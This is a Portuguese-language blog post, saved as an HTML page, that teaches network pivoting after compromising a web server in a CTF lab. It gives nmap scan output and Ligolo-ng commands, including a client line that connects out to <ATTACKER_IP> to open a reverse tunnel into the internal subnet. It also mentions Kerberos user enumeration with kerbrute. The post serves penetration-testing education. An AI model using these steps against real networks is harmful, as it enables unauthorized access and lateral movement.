<!doctype html> <html lang=""> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Network Pivoting | Geleia </title> <meta name="author" content="Geleia "> <meta name="description" content="pivotando"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://geleiaa.github.io/blog/2025/network_pivot/"> <script src="/assets/js/theme.js?a5ca4084d3b81624bcfa01156dae2b8e"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>initTheme();</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Geleia</span> </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Network Pivoting</h1> <p class="post-meta"> March 01, 2025 </p> <p class="post-tags"> <a href="/blog/2025"> <i class="fa-solid fa-calendar fa-sm"></i> 2025 </a> &nbsp; &middot; &nbsp; <a href="/blog/category/network"> <i class="fa-solid fa-tag fa-sm"></i> network</a> &nbsp; <a href="/blog/category/windows"> <i class="fa-solid fa-tag fa-sm"></i> windows</a> &nbsp; <a href="/blog/category/bhatagem"> <i class="fa-solid fa-tag fa-sm"></i> bhatagem</a> &nbsp; </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="network-pivoting">Network Pivoting</h2> <h4 id="network-pivoting-é-uma-técnica-de-pós-exploração-usada-para-acessar-a-rede-de-maquinas-comprometidas">Network Pivoting é uma técnica de pós-exploração usada para acessar a rede de maquinas comprometidas…</h4> <p>Exemplificando, vamos supor o seguinte cenario:</p> <h4 id="um-atacante-explora-alguma-vulnerabilidade-em-uma-aplicação-web-e-consegue-acesso-ao-shell-do-server-em-que-a-aplicação-está-rodando-depois-de-conseguir-o-acesso-e-fazer-um-recon-local-o-atacante-percebe-que-esse-server-está-numa-borda-entre-a-internet-e-a-uma-rede-interna-onde-estão-outros-serividores-e-maquinas-que-o-server-comprometido-pode-acessar-essa-rede-do-server-é-uma-rede-dmz-demilitarized-zone-que-é-uma-sub-net-geralmente-atras-de-um-firewall-isolada-do-resto-da-rede-interna-e-também-a-unica-parte-da-rede-que-é-acessivel-pela-internet">Um atacante explora alguma vulnerabilidade em uma aplicação web e consegue acesso ao shell do server em que a aplicação está rodando. Depois de conseguir o acesso e fazer um recon local, o atacante percebe que esse server está numa borda entre a internet e a uma rede interna onde estão outros serividores e maquinas que o server comprometido pode acessar. Essa rede do server é uma rede DMZ (demilitarized zone) que é uma sub-net (geralmente atras de um firewall) isolada do resto da rede interna e também a unica parte da rede que é acessivel pela internet.</h4> <figure> <picture> <img src="/assets/img/net-pivot-2.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="sabendo-disso-o-atacante-tem-algumas-opções-duas-delas-são">Sabendo disso o atacante tem algumas opções, duas delas são:</h4> <h4 id="1---continuar-a-pós-exploração-usando-o-server-comprometido-para-ter-acesso-a-rede-interna-e-pra-isso-ele-vai-ter-que-upar-as-tools-no-server-e-usa-las-atravez-dele">1 - Continuar a pós-exploração usando o server comprometido para ter acesso a rede interna (e pra isso ele vai ter que “upar” as tools no server e usa-las atravez dele).</h4> <h4 id="2---pode-abrir-um-tunel-entre-o-server-e-a-maquina-local-para-ter-um-acesso-direto-a-rede-interna-do-target">2 - Pode abrir um tunel entre o server e a maquina local para ter um acesso direto a rede interna do target.</h4> <h4 id="obviamente-opção-2">Obviamente opção 2.</h4> <h4 id="agora-que-vocês-estão-contextualizados-vamos-para-a-parte-pratica-da-coisa">Agora que vocês estão contextualizados vamos para a parte pratica da coisa.</h4> <h3 id="1---depois-da-shell">1 - Depois da shell</h3> <p>Para não prolongar muito vou pular logo pra parte em que ja temos acesso ao shell da maquina comprometida. Nesse exemplo retirado de um ctf, a acesso foi pelo vazamento das credenciais ssh usadas por um dev para acessar o web-server de produção.</p> <p>Podemos ver que a interface de rede eth0 do server tem um ip de faixa reservado para ser usado em LAN (https://whatismyipaddress.com/reserved-ip-address-blocks). E esse ip está em uma sub-net /24, ou seja, ja sabemos quantas possibilidades de ip temos, então podemos fazer um simples scan para achar mais hosts ativos naquela sub-net.</p> <figure> <picture> <img src="/assets/img/ipa.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Fazendo um scan no range local /24 vemos que existem mais dois hosts ativos. Pelas portas abertas nesses hosts é possivel afirmar que são hosts windows, um deles é um Active Directory.</p> <p>(eu simplesmente upei o binario do nmap no server pra facilitar o scan e mostrar tudo aqui)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -v -T5 172.16.20.0/24

Nmap scan report for DC-01 (172.16.20.1)
Host is up (0.0020s latency).
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
443/tcp open  https
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps

Nmap scan report for 172.16.20.2
Host is up (0.0013s latency).
Not shown: 1152 closed ports
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  epmap
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap scan report for 172.16.20.3
Host is up (0.00013s latency).
Not shown: 1154 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

</code></pre></div></div> <h4 id="ok-vamos-ver-o-que-temos">Ok, vamos ver o que temos:</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.20.1 - Actve Directory

172.16.20.2 - web-server windows IIS

172.16.20.3 - é o próprio server linux em que estamos
</code></pre></div></div> <h4 id="agora-temos-certeza-de-que-o-server-linux-comprometido-pode-acessar-diretamente-outros-hosts-na-rede-interna-vamos-para-a-pivotagem">Agora temos certeza de que o server linux comprometido pode acessar diretamente outros hosts na rede interna, vamos para a pivotagem.</h4> <h2 id="2---pivoting-pivotando-ou-pivotagem">2 - Pivoting (pivotando ou pivotagem)</h2> <p>Se você pesquisar por “network pivoting” vai achar varias tools que possibilitam abrir tuneis atravez de redes comprometidas. Algumas aproveitam de conexões ssh para fazer <code class="language-plaintext highlighter-rouge">port forwarding</code>, outras usam <code class="language-plaintext highlighter-rouge">socks proxy</code> entre um server e um client, e com essas tools é realmente possivel fazer pivot, mas aqui vamos ver uma tecnica diferente que é tão eficaz quanto as outras.</p> <p>Nesse exemplos usaremos a tool Ligolo-ng.</p> <ul> <li>https://github.com/nicocha30/ligolo-ng “Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).”</li> </ul> <p>O que o ligolo-ng faz de diferente é usar “userland network stack” e cria uma interface de rede virtual que é usada entre o client e server agent. O Ligolo-ng utiliza a interface TUN para redirecionar pacotes de rede entre o client e o server, criando um túnel virtual entre as máquinas. Nesse caso o client é usado na maquina alvo e o server é “startado” na maquina do atacante. (ref no fim da pág)</p> <h4 id="ligolo-setup">ligolo setup</h4> <p>Seguindo o quickstart na documentação é bem simples.</p> <ul> <li>https://docs.ligolo.ng/Quickstart/</li> </ul> <p>Em releases https://github.com/nicocha30/ligolo-ng/releases faça download dos binarios client e server, depois descompacte:</p> <figure> <picture> <img src="/assets/img/clienteserver.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Com os binarios descompactados temos o <code class="language-plaintext highlighter-rouge">client</code> que precisa esta na maquina alvo e o <code class="language-plaintext highlighter-rouge">proxy</code> que é o server.</p> <p>(Para enviar o client para a maquina alvo você pode um server http python ou, como temos credenciais ssh, podemos usar scp. Essa parte fica por conta do cenario que o pivot será feito.)</p> <h4 id="1---inicie-o-server-na-maquina-do-atacante">1 - inicie o server na maquina do atacante</h4> <p><code class="language-plaintext highlighter-rouge">$ sudo ./proxy -serlfcert</code></p> <p>O server precisa ser iniciado com sudo porque o ligolo criar interface de rede e rotas na maquina.</p> <figure> <picture> <img src="/assets/img/startserver.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="2---inicie-o-client-na-maquina-comprometida">2 - inicie o client na maquina comprometida</h4> <p><code class="language-plaintext highlighter-rouge">$ ./client -connect &lt;ATTACKER_IP&gt;:11601 --accept-fingerprint &lt;SERVER_FINGERPRINT&gt;</code></p> <p>Usando o ip da maquina do atacante e a porta padrão que o server usa ao inicar, junto com o fingerprint do server pra usar o certificado TLS self-signed que o server gera.</p> <figure> <picture> <img src="/assets/img/startclient.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Depois de rodar o comando você recebe a confirmação de que o client se conectou ao server logo abaixo. E no terminal com o server rodando, também vemos que uma sessão foi iniciada a partir do client.</p> <figure> <picture> <img src="/assets/img/clientconnected.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Selecione a sessão com o comando <code class="language-plaintext highlighter-rouge">session</code> e o número da sessão</p> <figure> <picture> <img src="/assets/img/selectsession.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="3---com-o-client-e-o-server-conectados-crie-a-tun-interface-que-vai-ser-usado-pelo-ligolo">3 - Com o client e o server conectados, crie a tun interface que vai ser usado pelo ligolo</h4> <p><code class="language-plaintext highlighter-rouge">interface_create --name &lt;NAME&gt;</code></p> <p>(você pode usar o nome que quiser. nessa demo eu usei o nome “pivot”)</p> <figure> <picture> <img src="/assets/img/createinterface.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Confirme que a interface foi criada na maquina listando todas elas:</p> <figure> <picture> <img src="/assets/img/ifconfig.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="4---starte-o-tunel-usando-a-interface-tun-criada">4 - Starte o tunel usando a interface tun criada</h4> <p><code class="language-plaintext highlighter-rouge">tunnel_start --tun &lt;INTERFACE_NAME&gt;</code></p> <figure> <picture> <img src="/assets/img/tunnelstart.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="5---set-a-rota-da-rede-alvo">5 - Set a rota da rede alvo</h4> <p><code class="language-plaintext highlighter-rouge">interface_route_add --name &lt;INTERFACE_NAME&gt; --route 172.16.20.0/24</code></p> <figure> <picture> <img src="/assets/img/createroute.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>O range de ip que você vai usar depende de qual range a rede alvo usa, se é 192.168.x.x ou 10.10.x.x. Na maquina dessa demo o é range 172.16.20.0/24, como vimos la em cima.</p> <p>Confirme que a rota e o ip está correto no próprio shell do server ligolo</p> <p><code class="language-plaintext highlighter-rouge">route_list</code></p> <figure> <picture> <img src="/assets/img/routelist.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p><code class="language-plaintext highlighter-rouge">ifconfig</code></p> <figure> <picture> <img src="/assets/img/ligoloifconfig.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="6---depois-de-setar-o-rota-e-verificar-se-está-tudo-certo-ja-temos-acesso-a-rede-interna-do-maquina-comprometida">6 - Depois de setar o rota e verificar se está tudo certo, ja temos acesso a rede interna do maquina comprometida</h4> <p>Pingando os ips da rede interna do alvo</p> <figure> <picture> <img src="/assets/img/ping1.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/ping2.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>Podemos alcançar os hosts da rede alvo a partir da maquina local do atacante</p> <p>Nmap scan do AD server e enumeração de usarios com kerbrute</p> <figure> <picture> <img src="/assets/img/nmapscan.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <figure> <picture> <img src="/assets/img/kerbrute.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="resumindo-um-atacante-obteve-acesso-a-uma-rede-interna-atravez-de-um-web-server-comprometido-tendo-a-possibilidade-de-alcançar-hosts-que-deveriam-ser-acessiveis-pelo-pessoal-autorizado-naquela-rede">Resumindo, um atacante obteve acesso a uma rede interna atravez de um web-server comprometido, tendo a possibilidade de alcançar hosts que deveriam ser acessiveis pelo pessoal autorizado naquela rede.</h4> <figure> <picture> <img src="/assets/img/net-pivot-3.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h4 id="essa-foi-uma-simples-demonstração-de-como-é-pivotar-entre-redes-comprometidas-com-facilidade-tornando-possével-realizar-movimentação-lateral-entre-os-hosts-escalar-privilégios-e-mais">Essa foi uma simples demonstração de como é pivotar entre redes comprometidas com facilidade tornando possével realizar movimentação lateral entre os hosts, escalar privilégios e mais…</h4> <h4 id="refs">Refs</h4> <ul> <li>https://docs.ligolo.ng/</li> <li>https://www.youtube.com/watch?v=qou7shRlX_s</li> <li>https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/</li> <li> <p>metasploit pivoting - https://pentest.blog/explore-hidden-networks-with-double-pivoting/</p> </li> <li>IA text ``` “Userland network stack” refere-se a uma pilha de rede (network stack) que é implementada no espaço de usuário (userland) em vez de ser implementada no espaço do kernel do sistema operacional.</li> </ul> <p>Normalmente, em um s.o tradicional, a pilha de rede (responsável por gerenciar o tráfego de rede, como TCP/IP) é parte do núcleo (kernel)… enviar e receber pacotes de dados, acontecem no contexto do kernel, que tem privilégios elevados para manipular diretamente o hardware e o tráfego de rede.</p> <p>“userland network stack” coloca a pilha de rede no espaço de usuário, ou seja, em uma camada mais alta do sistema, fora do núcleo. Isso significa que o processamento das comunicações de rede não é realizado diretamente no kernel, mas em um programa que é executado em modo de usuário.</p> <p>“TUN interface” TUN (Network TUNnel) é uma interface de rede virtual que opera na camada de rede (camada 3 do modelo OSI). Ela é usada para enviar e receber pacotes de rede em forma de pacotes IP. O TUN é geralmente usado para criar VPNs (Virtual Private Networks) e outros tipos de redes virtuais. A interface TUN cria uma conexão de rede virtual que o sistema operacional pode tratar como se fosse uma interface de rede real (como uma interface de rede física), mas em um contexto de espaço de usuário.</p> <p>```</p> </div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> 2025 Geleia . </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?b7816bd189846d29eded8745f9c4cf77"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>